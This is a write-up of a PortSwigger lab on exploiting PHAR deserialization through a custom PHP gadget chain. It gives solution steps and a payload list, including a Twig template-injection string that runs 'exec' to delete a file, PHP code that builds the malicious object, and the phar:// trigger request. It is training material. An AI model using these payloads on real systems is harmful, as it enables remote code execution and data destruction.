# Lab: Using PHAR deserialization to deploy a custom gadget chain

**Official lab:** [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)

## Lab idea

This challenge presents an indirect PHP deserialization path involving PHAR handling and a custom gadget chain. It practices recognizing that deserialization risk can arise through file-related features rather than an obvious deserialize call.

## Vulnerability in brief
Serialization converts an object and its state into a format that can be stored or transmitted; deserialization rebuilds that data as a usable object. Insecure deserialization occurs when an application deserializes data that an attacker can control. Because object fields and, in some implementations, object types are restored, crafted data may influence application logic before or during normal use of the object. This is a vulnerability class, not a general learning or testing category.

## Solution idea
1. Observe that the website has a feature for uploading your own avatar, which only accepts JPG images.
2. In Burp Repeater, request GET /cgi-bin to find an index that shows a Blog.php and CustomTemplate.php file.
3. Study the source code and identify the gadget chain involving the Blog->desc and CustomTemplate->lockFilePath attributes.
4. Notice that the file_exists() filesystem method is called on the lockFilePath attribute.
- …
6. Upload this file as your avatar.
7. In Burp Repeater, modify the request line to deserialize your malicious avatar using a phar:// stream as follows: GET /cgi-bin/avatar.php?avatar=phar://wiener
8. Send the request to solve the lab.

## Payloads / key values
- `JPG`
- `GET /cgi-bin/avatar.php?avatar=wiener`
- `GET /cgi-bin`
- `Blog.php`
- `CustomTemplate.php`
- `.php~`
- `Blog->desc`
- `CustomTemplate->lockFilePath`
- `file_exists()`
- `lockFilePath`
- `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}`
- `CustomTemplate`
- `Blog`
- `class CustomTemplate {} class Blog {} $object = new CustomTemplate; $blog = new Blog; $blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}'; $blog->user = 'user'; $object->template_file_path = $blog;`
- `PHAR-JPG`
- `phar jpg polyglot`
- `phar://`
- `GET /cgi-bin/avatar.php?avatar=phar://wiener`

## Official source
- [PortSwigger Academy: Lab: Using PHAR deserialization to deploy a custom gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)
